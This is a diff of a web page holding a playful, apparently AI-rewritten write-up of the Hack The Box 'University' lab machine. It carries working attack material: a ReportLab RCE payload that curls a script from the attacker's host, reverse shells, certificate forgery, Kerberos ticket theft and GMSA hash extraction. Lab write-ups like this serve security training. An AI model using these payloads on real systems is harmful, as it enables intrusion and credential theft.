@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="color-scheme" content="light dark">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.839578655806">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.839691610260">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 4.6.0">
@@ -46,12 +46,12 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=4.6.0.839578655806" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=4.6.0.839691610260" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.839578655806" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.839691610260" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=4.6.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.839578655806" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.839578655806" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.839691610260" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.839691610260" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -170,7 +170,7 @@
     <div><a href="../../../../categories/active-directory/">Active-Directory</a>,&nbsp;</div>
     <div><a href="../../../../categories/windows/">Windows</a></div>
     <div class="mx-2">&#9679;</div>
-    <div class="flex items-center shrink-0">Published&nbsp;<span>2024-08-15</span></div>
+    <div class="flex items-center shrink-0">Published&nbsp;<span>2025-08-15</span></div>
 </div>
 
 <figure class="content-center">
@@ -179,6 +179,23 @@
 </figure>
 <h2 id="synopsis">Synopsis</h2>
 <p>University is an Insane Windows Active Directory machine that starts with a university webpage. The web application allows exporting user profile pages to a PDF using <code translate="no" v-pre>xhtml2pdf</code>, which is vulnerable to a Remote Code Execution vulnerability via <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33733">CVE-2023-33733</a>. This allows getting initial access to the machine. Subsequently, the account of a professor is compromised using a forged certificate. With the professor&#x27;s account, a malicious archive file is uploaded to exploit <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-36025">CVE-2023-36025</a>, which allows getting Remote Code Execution as the user who extracts the archive. A relay attack is then meticulously set up to perform an unconstrained delegation attack. On the newly compromised computer, the Kerberos ticket for a new user is extracted, enabling the reading of the password of a group-managed service account. This account can impersonate the domain Administrator, thus compromising the entire environment.</p>
+<div class="flex mb-6">
+    <div class="shrink-0 w-1.5 rounded-tl-lg rounded-bl-lg bg-callout-warning"></div>
+    <div class="flex w-full py-4 border border-l-0 rounded-tr-lg rounded-br-lg doc-callout bg-callout-base-bg border-callout-base-border" role="alert">
+        <div class="flex items-center ml-4 h-7">
+            <svg xmlns="http://www.w3.org/2000/svg" class="block text-callout-warning" width="22" height="22" viewBox="0 0 24 24" role="presentation">
+                <g fill="currentColor"><g>
+                    <path d="M22.48 15.59L14.01 1.45A2.968 2.968 0 0012.16.09c-.78-.19-1.58-.07-2.27.35-.41.25-.76.6-1.01 1.01v.01L.4 15.6c-.83 1.43-.33 3.27 1.1 4.1.45.26.95.4 1.48.4h16.95c.8-.01 1.55-.33 2.11-.9.56-.57.87-1.33.86-2.13a3.04 3.04 0 00-.42-1.48zm-1.87 2.21c-.19.19-.44.3-.69.3H2.99c-.17 0-.34-.05-.49-.13a.992.992 0 01-.37-1.35L10.6 2.48c.08-.14.2-.25.34-.33a.992.992 0 011.37.33l8.46 14.13c.09.15.13.32.13.49 0 .26-.1.51-.29.7z"></path>
+                    <path d="M11.45 12.1c.55 0 1-.45 1-1v-4c0-.55-.45-1-1-1s-1 .45-1 1v4c0 .56.45 1 1 1zM11.46 14.1c-.56 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"></path>
+                </g></g>
+            </svg>
+        </div>
+        <div class="pr-5 ml-3 w-full">
+            <h5>DISCLAIMER</h5>
+<p>This writeup has been rewritten by AI and contains traces of Gen Z humor. For the uninitiated: this is a shitpost with substance. Read at your own risk.</p>
+        </div>
+    </div>
+</div>
 <h2 id="enumeration">Enumeration</h2>
 <p>First thing we do is sign up for an account on the <code translate="no" v-pre>university.htb</code> site. While that’s cooking in the background, we’re also multitasking like it’s finals week by running kerbrute to find some valid users in the domain.</p>
 <div id="enumeration-code-1" class="codeblock-wrapper"><doc-codeblock>
@@ -193,7 +210,7 @@
 ...
 2024/12/22 13:35:40 &gt;  [+] VALID USERNAME:   kai.k@university.htb</code></pre>
 </doc-codeblock></div>
-<p>We now have a nice starter pack of usernames — professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we peep this feature that lets you request a signed certificate. The site hits us with:</p>
+<p>We now have a nice starter pack of usernames: professors, students, maybe that one guy who still emails in Comic Sans. Once we log in to the site, we check this feature that lets you request a signed certificate. The site hits us with:</p>
 <div id="enumeration-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">You can use it for login without need for credentials, deleting your account and uploading new lectures(for professors only).</code></pre>
 </doc-codeblock></div>
@@ -226,13 +243,13 @@ Last Name: lantern
 Address: Canada West - Vancouver
 Department: Information Systems Security</code></pre>
 </doc-codeblock></div>
-<p>Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says “nah fam” if we try to sign a cert for anyone we’re not logged in as. So for now — we’re locked to our own account cert. We ball later.</p>
+<p>Now obviously, my villain arc would be to make a cert for George and sneak into professor-only land... but the site says &quot;nah fam&quot; if we try to sign a cert for anyone we’re not logged in as. So for now we&#x27;re locked to our own account cert. We ball later.</p>
 <h2 id="foothold">Foothold</h2>
 <p>So while poking around the site in my “click every button like a toddler” era, I notice this cute lil’ <code translate="no" v-pre>Export Profile to PDF</code> feature. Being the nosy menace I am, I yeet that file into exiftool like:</p>
 <div id="foothold-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ exiftool profile.pdf</code></pre>
 </doc-codeblock></div>
-<p>Boom — ReportLab shows up in the metadata like &quot;hey bestie, wanna pwn me!&quot;. Turns out, ReportLab has <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a>, a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:</p>
+<p>Boom! ReportLab shows up in the metadata like &quot;hey bestie, wanna pwn me!&quot;. Turns out, ReportLab has <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a>, a vuln so unhinged it basically lets you cosplay as the server’s Python interpreter. Like bruh, imagine putting your resume into LinkedIn and suddenly LinkedIn starts running your shell commands. So naturally, I stuffed my bio with something... special:</p>
 <div id="foothold-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;para&gt;
 &lt;font color=&quot;[[[getattr(pow, Word('__globals__'))['os'].system('curl -o shell.ps1 http://10.10.14.65:8000/shell.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated &lt; 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'&quot;&gt;
@@ -260,7 +277,7 @@ university\wao</code></pre>
 <h2 id="user">User</h2>
 <p>I’m chilling in my fresh shell as <code translate="no" v-pre>university\wao</code>, feeling like I just unlocked a secret character skin, when I peep my group memberships... Remote Management Users. So if I can snag this user’s password, I get to WinRM my way in like it’s the VIP lounge at cyberclub.</p>
 <p>So I start creeping around the filesystem like a raccoon on a 3 AM 7-Eleven snack run, nosing in everything, praying for leftover pizza crusts (aka plaintext creds). And what do I stumble on? A folder literally named <code translate="no" v-pre>C:\Web\DB Backup</code>. Yeah... they really put “Backup” in the name and thought I wouldn’t look.</p>
-<p>Inside, I find a PowerShell script called <code translate="no" v-pre>db-backup-automator.ps1</code>. And let me tell you — the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.</p>
+<p>Inside, I find a PowerShell script called <code translate="no" v-pre>db-backup-automator.ps1</code>. And let me tell you, the vibes are immaculate. That filename alone is giving “I hardcoded something spicy in here but gaslit myself into thinking no one would ever find it.” Naturally, I’m opening that thing faster than I open DoorDash when I’m in my snack phase.</p>
 <div id="user-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\Web\DB Backups&gt; cat db-backup-automator.ps1
 cat db-backup-automator.ps1
@@ -274,7 +291,7 @@ $7zCommand = &quot;&amp; `&quot;$7zExePath`&quot; a `&quot;$zipFilePath`&quot; `
 
 Invoke-Expression -Command $7zCommand</code></pre>
 </doc-codeblock></div>
-<p>So I crack open <code translate="no" v-pre>db-backup-automator.ps1</code> and, surprise surprise, it’s doing a little &quot;backup the DB and encrypt it&quot; routine — but the password it’s using? Bruh. It&#x27;s giving lazy dev energy. The script&#x27;s password is basically <code translate="no" v-pre>WebAO1337</code>, and since my user is WAO, the math is mathing. I spit those creds into WinRM:</p>
+<p>So I crack open <code translate="no" v-pre>db-backup-automator.ps1</code> and, surprise surprise, it’s doing a little &quot;backup the DB and encrypt it&quot; routine, but the password it’s using? Bruh. It&#x27;s giving lazy dev energy. The script&#x27;s password is basically <code translate="no" v-pre>WebAO1337</code>, and since my user is WAO, the math is mathing. I spit those creds into WinRM:</p>
 <div id="user-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ evil-winrm -i 10.10.11.39 -u 'wao' -p 'WebAO1337'</code></pre>
 </doc-codeblock></div>
@@ -282,7 +299,7 @@ Invoke-Expression -Command $7zCommand</code></pre>
 <div id="user-code-3" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">*Evil-WinRM* PS C:\Web\University&gt; download db.sqlite3</code></pre>
 </doc-codeblock></div>
-<p>Pulled the <code translate="no" v-pre>db.sqlite3</code> straight off the server with Evil-WinRM — feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations.</p>
+<p>Pulled the <code translate="no" v-pre>db.sqlite3</code> straight off the server with Evil-WinRM. Feeling like the main character already. Peep inside the DB and we got user creds and CSR file locations.</p>
 <div id="user-code-4" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-sql"><code v-pre class="language-sql">sqlite&gt; select id,username,password,csr,user_type from University_customuser;
 
@@ -303,7 +320,7 @@ Mode                LastWriteTime         Length Name
 -a----        2/15/2024   5:48 AM           1704 rootCA.key                                                            
 -a----       12/22/2024  12:16 PM             42 rootCA.srl</code></pre>
 </doc-codeblock></div>
-<p>Since we&#x27;ve basically got the keys to the kingdom (rootCA cert + key from the server), I whip up a professor cert for Martin like I&#x27;m running my own shady university IT department. Openssl be like “Certificate request self-signature ok” — yeah, it better be.</p>
+<p>Since we&#x27;ve basically got the keys to the kingdom (rootCA cert + key from the server), I whip up a professor cert for Martin like I&#x27;m running my own shady university IT department. Openssl be like “Certificate request self-signature ok”. Yeah, it better be.</p>
 <div id="user-code-6" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ openssl x509 -req -in 5.csr -CA rootCA.crt -CAkey rootCA.key -CAcreateserial
 
@@ -367,7 +384,7 @@ PS C:\Windows\Temp&gt; ./agent.exe -connect 10.10.14.65:11601 -ignore-cert
 $ sudo ip route add 192.168.99.0/24 dev ligolo
 $ evil-winrm -i 192.168.99.2 -u 'wao' -p 'WebAO1337'</code></pre>
 </doc-codeblock></div>
-<p>We can also SSH into LAB-2 with WAO’s creds and immediately <code translate="no" v-pre>sudo su</code> into root — easiest W of my life.</p>
+<p>We can also SSH into LAB-2 with WAO’s creds and immediately <code translate="no" v-pre>sudo su</code> into root. Easiest W of my life.</p>
 <div id="user-code-10" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ssh wao@192.168.99.12
 wao@192.168.99.12's password: WebAO1337
@@ -375,7 +392,7 @@ wao@192.168.99.12's password: WebAO1337
 $ sudo su
 root@LAB-2:#</code></pre>
 </doc-codeblock></div>
-<p>Alright, so plot twist time — instead of begging the main server to run our payload, we switch to “what if <code translate="no" v-pre>WS-3</code> does the heavy lifting?” energy. The idea: if a file gets opened from <code translate="no" v-pre>WS-3</code>, we can make it point straight to <code translate="no" v-pre>LAB-2</code> and skip all the drama. So I tweak my reverse shell to target <code translate="no" v-pre>LAB-2</code>&#x27;s IP (192.168.99.12) instead:</p>
+<p>Alright, so plot twist time, instead of begging the main server to run our payload, we switch to “what if <code translate="no" v-pre>WS-3</code> does the heavy lifting?” energy. The idea: if a file gets opened from <code translate="no" v-pre>WS-3</code>, we can make it point straight to <code translate="no" v-pre>LAB-2</code> and skip all the drama. So I tweak my reverse shell to target <code translate="no" v-pre>LAB-2</code>&#x27;s IP (192.168.99.12) instead:</p>
 <div id="user-code-11" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ msfvenom -p cmd/windows/reverse_powershell lhost=192.168.99.12 lport=1337 &gt; rev.bat
 
@@ -383,7 +400,7 @@ root@LAB-2:#</code></pre>
 WS-3
 *Evil-WinRM* PS C:\Windows\Temp&gt; upload shell.bat</code></pre>
 </doc-codeblock></div>
-<p>Now the plan is simple: craft the <code translate="no" v-pre>.url</code> file so it points at that batch file living on <code translate="no" v-pre>WS-3</code>. As soon as some unsuspecting professor/admin clicks the shortcut, <code translate="no" v-pre>WS-3</code> will execute it, and boom — the callback will land right in <code translate="no" v-pre>LAB-2</code>’s waiting arms.</p>
+<p>Now the plan is simple: craft the <code translate="no" v-pre>.url</code> file so it points at that batch file living on <code translate="no" v-pre>WS-3</code>. As soon as some unsuspecting professor/admin clicks the shortcut, <code translate="no" v-pre>WS-3</code> will execute it, and boom, the callback will land right in <code translate="no" v-pre>LAB-2</code>’s waiting arms.</p>
 <div id="user-code-12" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">root@LAB-2:# nc -nlvp 1337
 Listening on [0.0.0.0]
@@ -401,7 +418,7 @@ Best regards.
 Help Desk team - Rose Lanosta.</code></pre>
 </doc-codeblock></div>
 <h2 id="root">Root</h2>
-<p>Right — now that we’ve got <code translate="no" v-pre>Martin.T</code> on <code translate="no" v-pre>WS-3</code>, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called <a href="https://github.com/decoder-it/LocalPotato">LocalPotato</a> (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let&#x27;s look for things that seem worthwhile.</p>
+<p>Right, now that we’ve got <code translate="no" v-pre>Martin.T</code> on <code translate="no" v-pre>WS-3</code>, that “not updated since 10/29/2023” note is basically a neon sign saying “Potato season is open”. The date is hinting to the latest Potato exploit called <a href="https://github.com/decoder-it/LocalPotato">LocalPotato</a> (a.k.a CVE-2023-21746). This exploit makes it possible to overwrite any file on the server, so let&#x27;s look for things that seem worthwhile.</p>
 <p>One file at <code translate="no" v-pre>C:\Program Files\Automation-Scripts\wpad-cache-cleaner.ps1</code> seems to be an automated cleanup script. If this script runs with higher privileges (scheduled task, service, or startup script), swapping it out for our payload means the next time it runs, we get a SYSTEM or admin shell.</p>
 <p>We will create the following <code translate="no" v-pre>shell.ps1</code> reverse shell script and then upload it to <code translate="no" v-pre>WS-3</code>:</p>
 <div id="root-code-1" class="codeblock-wrapper"><doc-codeblock>
@@ -441,7 +458,7 @@ $client.Close()</code></pre>
 [+] SMB Close File success
 [+] SMB Tree Disconnect success</code></pre>
 </doc-codeblock></div>
-<p>Boom — potato’s baked and served. After sitting there like a sniper in the bushes for ~10+ minutes, the task finally ran and called our reverse shell.</p>
+<p>Boom! Potato’s baked and served. After sitting there like a sniper in the bushes for ~10+ minutes, the task finally ran and called our reverse shell.</p>
 <div id="root-code-3" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">root@LAB-2:/# sudo nc -nvlp 443
 Listening on [0.0.0.0] (family 0, port 443)
@@ -452,7 +469,7 @@ ws-3\administrator</code></pre>
 </doc-codeblock></div>
 <p>That’s full local admin on <code translate="no" v-pre>WS-3</code>. Now there are several ways to get the root flag.</p>
 <h3 id="method-1">Method 1</h3>
-<p>Ok so first move — dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot — Rose&#x27;s TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with <code translate="no" v-pre>/ptt</code>.</p>
+<p>Ok so first move we dump any user Kerberos tickets from memory and pray we find one. Run Rubeus, dump all tickets, jackpot, Rose&#x27;s TGT is just sitting there in memory like it’s on clearance. We grab that Base64 ticket, renew it, and inject it straight into our current session with <code translate="no" v-pre>/ptt</code>.</p>
 <div id="method-1-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-powershell"><code v-pre class="language-powershell">PS C:\tmp&gt; .\Rubeus.exe dump /nowrap
 
@@ -494,7 +511,7 @@ Cached Tickets: (2)
     <img src="../../../../assets/images/writeups/university/bh.png" alt="" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1904" height="824" />
     <figcaption class="caption"></figcaption>
 </figure>
-<p>Drop <code translate="no" v-pre>GMSAPasswordReader.exe</code>, tell it to target &quot;GMSA-PClient01$&quot;, and it hands over every hash flavor — RC4, AES128, AES256, DES. The RC4 hash is all we need for the next step.</p>
+<p>Drop <code translate="no" v-pre>GMSAPasswordReader.exe</code>, tell it to target &quot;GMSA-PClient01$&quot;, and it hands over every hash flavor. RC4, AES128, AES256, DES. The RC4 hash is all we need for the next step.</p>
 <div id="method-1-code-3" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\tmp&gt; .\GMSAPasswordReader.exe --AccountName &quot;GMSA-PCLIENT01$&quot;
 Calculating hashes for Old Value
